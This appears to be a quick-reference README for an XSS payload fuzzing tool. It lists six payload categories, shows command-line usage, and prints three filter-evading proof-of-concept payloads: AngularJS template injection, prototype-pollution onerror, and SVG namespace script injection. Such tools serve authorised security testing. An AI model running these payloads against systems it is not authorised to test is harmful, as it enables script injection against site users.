# 🔥 Advanced XSS Categories - Quick Reference

## 📋 6 New God-Tier Categories Added to XSS Vibes V2

### 🎯 Categories Overview
- **Template Injection** (8 payloads) - SSTI, Mustache, AngularJS
- **Event Handler Injection** (8 payloads) - Dynamic events, setAttribute abuse  
- **JavaScript URI Injection** (8 payloads) - Protocol handlers, window.location
- **innerHTML SVG Namespace** (8 payloads) - SVG, mixed namespaces
- **JavaScript Proto Pollution XSS** (8 payloads) - Prototype pollution chains
- **URL JS Context** (8 payloads) - Script src, JSONP callbacks

### 🚀 Quick Usage
```bash
# Test all new categories
python3 tools/test_advanced_categories.py

# Test specific category
python3 tools/test_advanced_categories.py template_injection

# Use with AI tools
xss-ai-domfuzz --contexts template_injection,prototype_pollution
xss-context /path/to/app --format json
```

### 📁 Files Created
- `xss_vibes/data/categories/*.json` - Individual category files
- `xss_vibes/data/payloads_enhanced.json` - Combined enhanced payloads
- `docs/ADVANCED_XSS_CATEGORIES.md` - Complete documentation

### 💀 Example Payloads

**Template Injection (GOD TIER)**
```javascript
{{constructor.constructor('alert(1)')()}}
```

**Proto Pollution XSS (GOD TIER)**  
```javascript
__proto__.onerror = alert; throw 1;
```

**SVG Namespace (GOD TIER)**
```html
<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>
```

**Total: 48 Advanced Payloads | Evasion Level: 8-10/10**

📚 [Complete Documentation](docs/ADVANCED_XSS_CATEGORIES.md)
